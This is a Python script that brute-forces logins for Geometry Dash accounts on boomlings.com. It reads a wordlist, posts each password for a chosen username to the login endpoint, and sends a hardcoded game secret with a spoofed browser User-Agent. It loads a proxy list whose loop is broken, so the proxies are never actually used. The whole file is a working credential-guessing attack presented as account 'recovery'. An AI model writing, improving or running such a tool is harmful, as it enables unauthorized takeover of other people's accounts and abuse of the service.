import requests
import uuid

def Main(dictionary):
    uid = uuid.uuid4()
    passwords = []

    proxies = "proxies.txt"

    with open(proxies, 'r') as f:
        lproxies = f.read().splitlines()

    with open(dictionary, "r") as f:
        for line in f:
            passwords.append(line.strip())

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36"
    }

    for proxy in lproxies:
        proxy_dict = {
            'http': f'http://{proxy}',
            'https': f'https://{proxy}'
        }

    
    user = input("Enter the user to recover: ")

    for password in passwords:
        data = {
            "userName":user,
            "udid":uid,
            "password":password,
            "secret":"Wmfv3899gc9"
        }

        response = requests.post("http://www.boomlings.com/database/accounts/loginGJAccount.php", headers=headers, data=data, timeout=2.5)

        if "," in response.text:
            print("Password found!:", password)
            break

if __name__ == "__main__":
    dictionary = input("Enter dictionary: ")
    Main(dictionary=dictionary)
    input("Press any key to continue...")